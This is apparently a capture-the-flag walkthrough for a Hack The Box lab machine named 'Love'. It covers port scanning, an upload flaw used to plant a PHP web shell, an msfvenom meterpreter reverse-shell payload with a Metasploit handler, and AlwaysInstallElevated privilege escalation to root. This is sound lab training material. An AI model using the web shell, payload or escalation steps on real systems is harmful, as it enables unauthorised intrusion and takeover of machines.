![LOVE](images/banner.png)
```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
```
## Foothold

On Port 443 we see a insecure certificate:
![image](https://user-images.githubusercontent.com/24591381/118567957-14081f80-b777-11eb-84e4-a4806b44461e.png)

So we add staging.love.htb to our /etc/hosts.

On the demo on the site we find a File Scanner with which we can include files from /admin/ and / with localhost/[filename].

That's how we found out, that we could add users with the http://love.htb/admin/includes/voters_modal.php, however it doesn't work because the path in the POST is wrong. So we intercept it with burpsuite and remove "includes" from the path, so that our POST gets send to the right voters_add. 

## User

Now we can succesfully add new users. We also found out, that we can upload files through the photo parameter which aren't pictures. These files can be reached under love.htb/images. So we upload this basic shell.php and meterprete.exe:

shell.php
```php
<?php
header('Content-type: text/plain');
exec('meterpreter.exe');
?>
```
meterpreter.exe created with msfvenom:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > meterpreter.exe
```
We use the multi/handler listener in msfconsole:
```
use exploit/multi/handler
```
after setting LHOST and LPORT we set PAYLOAD to:
```
windows/x64/meterpreter/reverse_tcp
```

## Root

PrivEsc is straight forward as winPeas already gives the right hint: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated.

We can just use the recommended post exploit msf payload since we are already in a meterpreter session. After switching our session in the background with "bg" we just use:
```
use exploit/windows/local/always_install_elevated
```
Now we only need to set LPORT and LHOST aswell as our session ID which we can find out by simply running "sessions".
After that just hit "run" and we are root.
